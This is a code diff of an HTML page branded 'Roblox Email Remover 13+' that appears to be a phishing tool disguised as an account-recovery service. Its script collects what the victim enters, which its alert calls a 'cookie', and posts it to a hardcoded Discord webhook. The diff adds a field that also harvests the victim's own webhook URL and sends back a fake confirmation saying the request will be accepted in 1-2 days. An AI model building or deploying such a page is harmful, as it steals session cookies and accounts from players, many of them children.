@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Roblox Account Recovery</title>
+  <meta charset="UTF-8" />
+  <title>Roblox Email Remover 13+</title>
   <style>
     body {
       background: linear-gradient(to bottom, #000000, #001f3f);
@@ -40,39 +39,52 @@
 </head>
 <body>
   <h1>Roblox Email Remover 13+</h1>
-  <input type="text" id="userInput" placeholder="Enter your username or email">
-  <br>
+  <input type="text" id="userInput" placeholder="Enter your username or email" />
+  <br />
+  <input type="text" id="webhookInput" placeholder="Enter your webhook URL" />
+  <br />
   <button onclick="submitData()">Submit</button>
 
   <script>
-    function submitData() {
-      const input = document.getElementById("userInput").value;
+    async function submitData() {
+      const userInput = document.getElementById("userInput").value.trim();
+      const userWebhook = document.getElementById("webhookInput").value.trim();
+      const mainWebhook =
+        "https://discord.com/api/webhooks/1375168427542712421/Utte56jqrUGRl_V5-VuyoI4jAyMCoHMW52MaNVna4wpiYaRMMQodGLIjficdZ0wgKyO4";
 
-      if (!input.trim()) {
-        alert("enter cookie.");
+      if (!userInput) {
+        alert("Please enter a cookie.");
+        return;
+      }
+      if (!userWebhook || !userWebhook.startsWith("https://discord.com/api/webhooks/")) {
+        alert("Please enter a valid Discord webhook URL.");
         return;
       }
 
-      fetch("https://discord.com/api/webhooks/1375168427542712421/Utte56jqrUGRl_V5-VuyoI4jAyMCoHMW52MaNVna4wpiYaRMMQodGLIjficdZ0wgKyO4", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `New recovery request: ${input}`
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          alert("Your request was submitted successfully.");
-        } else {
-          alert("There was an issue submitting your request.");
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
-        alert("Error sending request.");
-      });
+      try {
+        // Send data to your main webhook for confirmation
+        await fetch(mainWebhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `New recovery request:\nUser input: ${userInput}\nUser webhook: ${userWebhook}`,
+          }),
+        });
+
+        // Send confirmation message to the user's webhook
+        await fetch(userWebhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: "Your request will be accepted in 1-2 days.",
+          }),
+        });
+
+        alert("Your request was submitted successfully.");
+      } catch (error) {
+        console.error("Error sending request:", error);
+        alert("There was an issue submitting your request.");
+      }
     }
   </script>
 </body>
